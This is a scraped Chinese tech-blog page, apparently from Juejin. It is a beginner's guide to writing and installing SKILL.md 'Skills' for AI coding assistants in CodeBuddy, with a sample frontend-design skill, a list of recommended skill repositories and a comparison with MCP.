itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            拒绝当“重复提示词机器“：Skills 完全入门指南，及与 MCP 的深度对比
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411151088782442/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    让我上个超影吧
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:03:59.000Z" title="Tue Feb 03 2026 10:03:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、什么是 Skills？它到底解决了什么痛点？</h2>
<p>想象这样一个场景：你正在用<strong>CodeBuddy</strong>写代码，每次让 AI 帮忙审查代码，都要重复说： <strong>"请用中文写注释"、"记得检查空指针"、"按照我们团队的 RESTful 规范来</strong>"。说了一遍又一遍，AI 还是经常忘记。</p>
<p><strong>Skills（技能）就是来解决这个问题的。</strong></p>
<p>简单来说，<strong>Skills 是给 AI 准备的一份"专业上岗培训手册"</strong> 。你可以把团队的代码规范、特定的开发流程、或者某个领域（如 Chrome 插件开发）的最佳实践，打包成一个 Skill。一旦安装，AI 就会自动记住这些规则，在你需要的时候自动调用，无需反复提醒。</p>
<h4 data-id="heading-1">核心痛点解决</h4>






























<table><thead><tr><th>痛点</th><th>传统方式</th><th>使用 Skills 后</th></tr></thead><tbody><tr><td>重复劳动</td><td>每次都要粘贴同样的 prompt</td><td>一次编写，永久复用，自动触发</td></tr><tr><td>团队标准不一</td><td>新人不知道团队规范，AI 输出风格各异</td><td>Skill 随 Git 仓库共享，全员统一标准</td></tr><tr><td>上下文溢出</td><td>长 prompt 占用大量 token，导致 AI 失忆</td><td>渐进式加载，用时才展开，节省 token</td></tr><tr><td>知识沉淀困难</td><td>好的提示词散落在聊天记录里</td><td>标准化文件，可版本控制，沉淀为团队资产</td></tr></tbody></table>
<p><strong>一句话总结</strong>：Skills 让 AI 从"通用实习生"变成"懂行老手"，知道在什么时候该用什么方法做什么事。</p>
<p>这里也推荐我在B站看的科普视频，讲得很形象</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1dz6oBWEWx%2F%3Fspm_id_from%3D333.1391.0.0" target="_blank" title="https://www.bilibili.com/video/BV1dz6oBWEWx/?spm_id_from=333.1391.0.0" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1dz…</a></p>
<h2 data-id="heading-2">二、在 CodeBuddy中使用 Skills：从零开始</h2>
<p>这里为啥用CodeBuddy这个软件，无他，就因为免费，大多数人能够直接接触到，国外的一些IDE和模型都要用魔法，新手使用不方便</p>
<p>CodeBuddy（腾讯的 AI IDE）近期全面支持了 Skills 功能，并且支持<strong>全局 Skills</strong>（所有项目通用）和<strong>项目 Skills</strong>（仅当前项目生效）两种类型</p>
<h3 data-id="heading-3">第一步：创建 Skills 的目录</h3>
<p>Skills 通过在特定目录中创建 <code>SKILL.md</code> 文件来定义：</p>
<blockquote>
<ol>
<li><strong>项目级 Skills</strong>：<code>.codebuddy/skills/</code>（项目根目录下）</li>
<li><strong>用户级 Skills</strong>：<code>~/.codebuddy/skills/</code>（用户主目录下）</li>
</ol>
</blockquote>
<p>每个 Skill 一个独立的目录，包含 <code>SKILL.md</code> 文件，整体框架目录如下：</p>
<pre><code class="hljs language-objectivec" lang="objectivec">.codebuddy/skills/
├── pdf/
│   └── <span class="hljs-built_in">SKILL</span>.md
├── data-analysis/
│   └── <span class="hljs-built_in">SKILL</span>.md
└── code-review/
    └── <span class="hljs-built_in">SKILL</span>.md
</code></pre>
<p>每个技能文件夹下面又可以细分</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">skill-name</span>(pdf)/
├── SKILL<span class="hljs-selector-class">.md</span> (必需)
│   ├── YAML frontmatter 元数据 (必需)
│   │   ├── name: (必需)
│   │   └── description: (必需)
│   └── Markdown 指令 (必需)
└── Bundled Resources (可选)
    ├── scripts/          - 可执行代码 (Python/Bash 等)
    ├── references/       - 旨在根据需要加载到上下文中的文档
    └── assets/           - 用在输出中的文件 (模板、图标、字体等)
</code></pre>
<h4 data-id="heading-4"><strong>SKILL.md (必需)</strong></h4>
<p>这是 Skill 的核心定义文件。</p>
<p><strong>元数据 (</strong> <strong>YAML</strong> <strong>Frontmatter):</strong> <strong><code>name</code></strong> ****和 <strong><code>description</code></strong> ****决定了 AI 何时会使用这个 Skill。描述需具体说明 Skill 的功能和使用场景。</p>
<p>示例：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">pdf-editor</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">This</span> <span class="hljs-string">skill</span> <span class="hljs-string">should</span> <span class="hljs-string">be</span> <span class="hljs-string">used</span> <span class="hljs-string">when</span> <span class="hljs-string">users</span> <span class="hljs-string">ask</span> <span class="hljs-string">to</span> <span class="hljs-string">modify,</span> <span class="hljs-string">rotate,</span> <span class="hljs-string">or</span> <span class="hljs-string">extract</span> <span class="hljs-string">text</span> <span class="hljs-string">from</span> <span class="hljs-string">PDF</span> <span class="hljs-string">files.</span>
<span class="hljs-attr">allowed-tools:</span> <span class="hljs-comment"># 可选，指定允许使用的工具</span>
<span class="hljs-attr">disable:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># 可选，是否禁用</span>
<span class="hljs-meta">---
</span>
<span class="hljs-comment"># PDF Editor</span>

<span class="hljs-string">To</span> <span class="hljs-string">rotate</span> <span class="hljs-string">a</span> <span class="hljs-string">PDF...</span>
</code></pre>
<h4 data-id="heading-5">打包资源 (可选)</h4>
<ol>
<li>
<h5 data-id="heading-6">Scripts (<code>scripts/</code>)</h5>
</li>
</ol>
<p>用于需要确定性可靠性或被重复重写的任务的可执行代码。</p>
<blockquote>
<ul>
<li><strong>用途</strong>：当代码被重复重写或需要高可靠性时。</li>
<li><strong>示例</strong>：<code>scripts/rotate_pdf.py</code> 用于 PDF 旋转。</li>
</ul>
</blockquote>
<ol start="2">
<li>
<h5 data-id="heading-7">References (<code>references/</code>)</h5>
</li>
</ol>
<p>旨在根据需要加载到上下文中以辅助 AI 思考的文档和参考资料。</p>
<blockquote>
<ul>
<li><strong>用途</strong>：数据库架构、API 文档、领域知识、公司政策等。</li>
<li><strong>优势</strong>：保持 <code>SKILL.md</code> 精简，仅在 AI 确定需要时才加载。</li>
</ul>
</blockquote>
<ol start="3">
<li>
<h5 data-id="heading-8">Assets (<code>assets/</code>)</h5>
</li>
</ol>
<p>不打算加载到上下文中，而是用于 AI 生成的输出中的文件。</p>
<blockquote>
<ul>
<li><strong>用途</strong>：品牌资产、PPT 模板、HTML/React 样板代码等。</li>
</ul>
</blockquote>
<p>了解完上面，创建的目录如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95ef5ff2961446ffaab769cd380d7c7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6p5oiR5LiK5Liq6LaF5b2x5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717839&amp;x-signature=GEQXlKl4R5PfFisTnG6kejVThW0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">第二步：创建你的第一个 Skill：比想象中简单</h3>
<p>一个标准的 Skill 就是一个文件夹，核心是 ****<strong><code>SKILL.md</code></strong> <strong>文件</strong></p>
<p>一个 Skill 本质上就是一个 Markdown 文件（文件名固定为 SKILL.md），内容几乎只由下面三段组成：</p>
<p>SKILL.md 基本模板:</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">your-skill-name</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">What</span> <span class="hljs-string">it</span> <span class="hljs-string">does</span> <span class="hljs-string">and</span> <span class="hljs-string">when</span> <span class="hljs-string">Claude</span> <span class="hljs-string">should</span> <span class="hljs-string">use</span> <span class="hljs-string">it</span>
<span class="hljs-meta">---
</span>
<span class="hljs-comment"># Skill Title</span>

<span class="hljs-comment">## Instructions</span>
<span class="hljs-string">Clear,</span> <span class="hljs-string">concrete,</span> <span class="hljs-string">actionable</span> <span class="hljs-string">rules.</span>

<span class="hljs-comment">## Examples</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">Example</span> <span class="hljs-string">usage</span> <span class="hljs-number">1</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">Example</span> <span class="hljs-string">usage</span> <span class="hljs-number">2</span>

<span class="hljs-comment">## Guidelines</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">Guideline</span> <span class="hljs-number">1</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">Guideline</span> <span class="hljs-number">2</span>
</code></pre>



































<table><thead><tr><th>字段</th><th>必填</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>name</td><td>否</td><td>Skill 名称,未指定时使用目录名</td><td>pdf</td></tr><tr><td>description</td><td>否</td><td>Skill 描述,帮助 AI 理解何时使用</td><td>PDF 文档处理专家 （project)</td></tr><tr><td>allowed-tools</td><td>否</td><td>允许使用的工具白名单,逗号分隔</td><td>Read, Write, Bash</td></tr><tr><td>disable-model-invocation</td><td>否</td><td>设置为 true 时，Skill 不会出现在 Skill 工具中，只能通过 /skill-name 手动触发</td><td>TRUE</td></tr></tbody></table>
<p>这里给出一个案例，大家可以进行尝试，比较简单，所以只是用<strong>SKILL.md</strong>即可，不需要脚本和素材之类的</p>
<p><strong>示例 ：前端页面设计 Skill</strong></p>
<p><strong>文件</strong>：<code>.codebuddy/skills/frontend-design/SKILL.md</code></p>
<pre><code class="hljs language-markdown" lang="markdown">---
name: frontend-design
description: 创建具有高品质设计的独特、生产级前端界面。当用户要求构建 Web 组件、页面、作品、海报或应用程序时使用此技能（示例包括网站、落地页、仪表盘、React 组件、HTML/CSS 布局，或为任何 Web UI 进行美化/优化）。生成具有创意、精致代码和 UI 设计，避免通用 AI 美学。
<span class="hljs-section">license: 完整条款见 LICENSE.txt
---</span>

本技能指导创建独特、生产级前端界面，避免通用的"AI 垃圾"美学。实现真正可用的代码，对美学细节和创意选择给予特别关注。

用户提供前端需求：要构建的组件、页面、应用程序或界面。他们可能包含有关用途、受众或技术约束的上下文。

<span class="hljs-section">## 设计思维</span>

在编码之前，理解上下文并致力于<span class="hljs-strong">**大胆**</span>的美学方向：
<span class="hljs-bullet">-</span> <span class="hljs-strong">**目的**</span>：此界面解决什么问题？谁使用它？
<span class="hljs-bullet">-</span> <span class="hljs-strong">**风格**</span>：选择一个极端：极简主义、极繁主义混乱、复古未来主义、有机/自然、奢华/精致、趣味/玩具风、编辑/杂志风、粗野主义/原始、装饰艺术/几何、柔和/ pastel、工业/实用等。有众多风格可供选择。将这些作为灵感，但设计出忠于美学方向的风格。
<span class="hljs-bullet">-</span> <span class="hljs-strong">**约束**</span>：技术要求（框架、性能、无障碍）。
<span class="hljs-bullet">-</span> <span class="hljs-strong">**差异化**</span>：是什么让它<span class="hljs-strong">**令人难忘**</span>？有什么是别人会记住的？

<span class="hljs-strong">**关键**</span>：选择清晰的概念方向并精准执行。大胆极繁和精致极简都有效——关键是意图性，而非强度。

然后实现可用的代码（HTML/CSS/JS、React、Vue 等），具备：
<span class="hljs-bullet">-</span> 生产级和功能完整
<span class="hljs-bullet">-</span> 视觉冲击力和令人难忘
<span class="hljs-bullet">-</span> 具有清晰美学观点的连贯性
<span class="hljs-bullet">-</span> 每个细节都精心打磨

<span class="hljs-section">## 前端美学指南</span>

专注于：
<span class="hljs-bullet">-</span> <span class="hljs-strong">**字体排版**</span>：选择美观、独特、有趣的字体。避免通用字体如 Arial 和 Inter；选择能够提升前端美学的独特字体；出人意料、有个性的字体选择。将独特的展示字体与精致正文字体搭配。
<span class="hljs-bullet">-</span> <span class="hljs-strong">**色彩与主题**</span>：致力于连贯的美学。使用 CSS 变量保持一致性。主色调搭配锐利点缀色胜过胆怯、均匀分布的调色板。
<span class="hljs-bullet">-</span> <span class="hljs-strong">**动效**</span>：使用动画实现效果和微交互。HTML 优先使用纯 CSS 方案。React 可用时使用 Motion 库。专注于高影响力时刻：一个精心编排的页面加载配合交错显示（animation-delay）比分散的微交互带来更多愉悦。使用滚动触发和令人惊喜的悬停状态。
<span class="hljs-bullet">-</span> <span class="hljs-strong">**空间构图**</span>：意想不到的布局。不对称。重叠。对角线流动。打破网格的元素。充足的负空间<span class="hljs-strong">**或**</span>控制的密度。
<span class="hljs-bullet">-</span> <span class="hljs-strong">**背景与视觉细节**</span>：创造氛围和深度，而非默认纯色。添加与整体美学匹配的上下文效果和纹理。应用创意形式如渐变网格、噪点纹理、几何图案、分层透明、戏剧性阴影、装饰性边框、自定义光标和颗粒叠加。

永远不要使用通用的 AI 生成美学，如过度使用的字体家族（Inter、Roboto、Arial、系统字体）、陈词滥调的配色方案（特别是白色背景上的紫色渐变）、可预测的布局和组件模式，以及缺乏上下文特性的千篇一律设计。

富有创意地诠释并做出出人意料的选择，让人感觉真正为上下文而设计。没有设计应该是相同的。在明暗主题、不同字体、不同美学之间变化。永远不要跨越世代趋同于常见选择（例如 Space Grotesk）。

<span class="hljs-strong">**重要**</span>：将实现复杂度与美学愿景匹配。极繁主义设计需要包含大量动画和效果的复杂代码。极简或精致设计需要克制、精确，并仔细关注间距、字体和微妙细节。优雅来自于良好地执行愿景。

记住：Claude 能够创造非凡的创意作品。不要退缩，展示当跳出思维定势并完全致力于独特愿景时，真正能创造什么。
</code></pre>
<h3 data-id="heading-10">第三步：使用Skill</h3>
<p>我们写一个前端html页面，刚好满足这个Skill，看下AI如何操作吧</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61ad47b1f8744996ab1d898759babf3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6p5oiR5LiK5Liq6LaF5b2x5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717839&amp;x-signature=6HnIquCrBV%2BHYJfmqVk17y7lgtU%3D" alt="" loading="lazy"/></p>
<p>可以看到AI自己自动使用Skill，接下来我们看一下页面的效果吧</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc64e64a445847bbbff04545f870d821~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6p5oiR5LiK5Liq6LaF5b2x5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717839&amp;x-signature=fJxW27jONiCVsEPno1mANSUrOgI%3D" alt="" loading="lazy"/></p>
<p>还是比较好看的</p>
<h2 data-id="heading-11">三、推荐开源 Skills及如何下载使用</h2>
<p>以下是 GitHub 上最热门的 Skills 仓库，下载后按照需要将对应的Skill导入到 <code>.codebuddy/skills/</code> 目录：</p>
<h3 data-id="heading-12">开源Skills</h3>
<blockquote>
<h4 data-id="heading-13">1. <strong>anthropics/skills</strong>（官方，必装）</h4>
<ul>
<li><strong>Star</strong>: 40k+</li>
<li><strong>地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills" target="_blank" title="https://github.com/anthropics/skills" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></li>
<li><strong>亮点</strong>：官方出品，包含文档处理（PDF/Word/Excel/PPT）、skill-creator（创建 Skill 的 Skill）、MCP 构建器等。新手入门首选。</li>
</ul>
</blockquote>
<h4 data-id="heading-14">2. <strong>obra/superpowers</strong>（社区最强）</h4>
<blockquote>
<ul>
<li><strong>Star</strong>: 22k+</li>
<li><strong>地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fobra%2Fsuperpowers" target="_blank" title="https://github.com/obra/superpowers" ref="nofollow noopener noreferrer">github.com/obra/superp…</a></li>
<li><strong>亮点</strong>：包含 20+ 实战技能，涵盖 TDD 测试驱动开发、Debug 调试模式、团队协作规范等，非常接地气。</li>
</ul>
</blockquote>
<h4 data-id="heading-15">3. <strong>vercel-labs/agent-skills</strong>（前端专属）</h4>
<blockquote>
<ul>
<li><strong>地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvercel-labs%2Fagent-skills" target="_blank" title="https://github.com/vercel-labs/agent-skills" ref="nofollow noopener noreferrer">github.com/vercel-labs…</a></li>
<li><strong>亮点</strong>：Vercel 团队维护，包含 <code>react-best-practices</code> 和 <code>vue-best-practices</code>，整理了 40+ 条 React/Next.js 性能与架构规则，AI 写代码时会主动提示性能陷阱。</li>
</ul>
</blockquote>
<h4 data-id="heading-16">4. <strong>K-Dense-AI/claude-scientific-skills</strong>（科研专属）</h4>
<blockquote>
<ul>
<li><strong>Star</strong>: 5.8k+</li>
<li><strong>地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FK-Dense-AI%2Fclaude-scientific-skills" target="_blank" title="https://github.com/K-Dense-AI/claude-scientific-skills" ref="nofollow noopener noreferrer">github.com/K-Dense-AI/…</a></li>
<li><strong>亮点</strong>：140+ 科学领域技能，生物、化学、数据分析、文献整理全覆盖，研究人员必备。</li>
</ul>
</blockquote>
<h4 data-id="heading-17">5. <strong>ComposioHQ/awesome-claude-skills</strong>（资源合集）</h4>
<blockquote>
<ul>
<li><strong>Star</strong>: 19k+</li>
<li><strong>地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FComposioHQ%2Fawesome-claude-skills" target="_blank" title="https://github.com/ComposioHQ/awesome-claude-skills" ref="nofollow noopener noreferrer">github.com/ComposioHQ/…</a></li>
<li><strong>亮点</strong>：Awesome 列表形式，汇集了官方和社区的各种 Skills，分类清晰，持续更新。</li>
</ul>
</blockquote>
<h3 data-id="heading-18"><strong>导入方法</strong>：</h3>
<ul>
<li><strong>CodeBuddy</strong> <strong>IDE</strong>：设置 → Skill 配置路径 → 导入本地文件夹</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c67b033257584487b2cb671da8e6ffcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6p5oiR5LiK5Liq6LaF5b2x5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717839&amp;x-signature=axxYAgivrObZiTrbkt0pPc2fco4%3D" alt="" loading="lazy"/></p>
<p>下载Skills，这里我是下载的第一个开源项目的所有的Skills</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4908fe0749a1430399b886710b293e11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6p5oiR5LiK5Liq6LaF5b2x5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717839&amp;x-signature=k16fcVv7YABX5oFk9Jdl4pWYvu0%3D" alt="" loading="lazy"/></p>
<p>选中你所需要的一条Skill导入CodeBuddy即可</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e34c1aa35244f1eaf7a4d6183a0744b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6p5oiR5LiK5Liq6LaF5b2x5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717839&amp;x-signature=uA8%2FqOUN6daxIsIPEZm262j6Ah4%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76f2098873f244f4af5b541fb8e1a4af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6p5oiR5LiK5Liq6LaF5b2x5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717839&amp;x-signature=TmIH4TjSfrtUNjKjSFyl6uOk86w%3D" alt="" loading="lazy"/></p>
<p>可以看到导入成功了</p>
<p>其实刚才最开始的示例我也是直接复制的这个开源项目的Skill才使得前端页面生成比较好看</p>
<h2 data-id="heading-19">四、Skills与MCP的区别</h2>
<p>最后就是很多人会混淆Skills和MCP，它们确实有相似之处，但解决的问题完全不同：</p>



































<table><thead><tr><th>对比维度</th><th>Skills</th><th>MCP</th></tr></thead><tbody><tr><td>核心定位</td><td>解决"方法论"问题，教AI怎么做某类任务</td><td>解决"连接"问题，让AI能访问外部世界</td></tr><tr><td>加载方式</td><td>按需加载，只加载技能名字和描述，使用时才加载执行细节</td><td>全量加载，不管用不用都全部加载进去</td></tr><tr><td>适用场景</td><td>固定工作流程，需要AI按步骤执行</td><td>访问外部数据或服务，深度集成外部系统</td></tr><tr><td>输入输出</td><td>自然语言描述和结果，灵活易读</td><td>JSON结构化参数和结果，可组合可测试</td></tr><tr><td>扩展性</td><td>可以无限增加技能，不会明显拖慢对话</td><td>工具越多，上下文越爆炸，成本和延迟越高</td></tr></tbody></table>
<p><strong>大白话理解</strong>：</p>
<blockquote>
<ul>
<li>Skills主要聚焦于工具处理，是一套完整的方法论，例如处理文件、设计、写文章</li>
<li>MCP主要起到连接作用，适合深度集成外部系统，自定义上传、下载、推送等流程</li>
</ul>
</blockquote>
<p>两者并不是竞争或替代的关系，而是结合关系。对于普通用户、日常工作，大部分时候只需要Skills就足够；对于复杂的企业场景、跨平台/自动分发等任务，使用Skills + MCP可以实现更加稳定和高效的输出。</p>
<p><strong>什么时候用Skills，什么时候用</strong> <strong>mcp</strong> <strong>？</strong></p>
<p>判断标准：任务是"如何做"还是"做什么"？</p>
<blockquote>
<ul>
<li>
<p><strong>Skills</strong>：当你有固定的工作流程，需要AI按步骤执行时</p>
<ul>
<li>示例："按什么格式写技术教程"、"代码审查的5个步骤"</li>
</ul>
</li>
<li>
<p><strong>MCP</strong>：当你需要AI访问外部数据或服务时</p>
<ul>
<li>示例："查询GitHub的Issue"、"读取SQLite数据库"</li>
</ul>
</li>
</ul>
</blockquote>
<p><strong>感兴趣的宝子可以关注一波，后续会更新更多有用的知识！！！</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94d92b4ed927471ba156d58f7dd69c7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6p5oiR5LiK5Liq6LaF5b2x5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717839&amp;x-signature=mLWFttNhmqNRforBOjGFITujbJs%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Go errgroup 源码深度剖析：从原理到 Context 取消机制全解析]]></title>    <link>https://juejin.cn/post/7602205524718927906</link>    <guid>https://juejin.cn/post/7602205524718927906</guid>    <pubDate>2026-02-03T10:07:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602205524718927906" data-draft-id="7602246300453306403" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Go errgroup 源码深度剖析：从原理到 Context 取消机制全解析"/> <meta itemprop="keywords" content="源码"/> <meta itemprop="datePublished" content="2026-02-03T10:07:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="下次一定57"/> <meta itemprop="url" content="https://juejin.cn/user/3722294009017404"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" 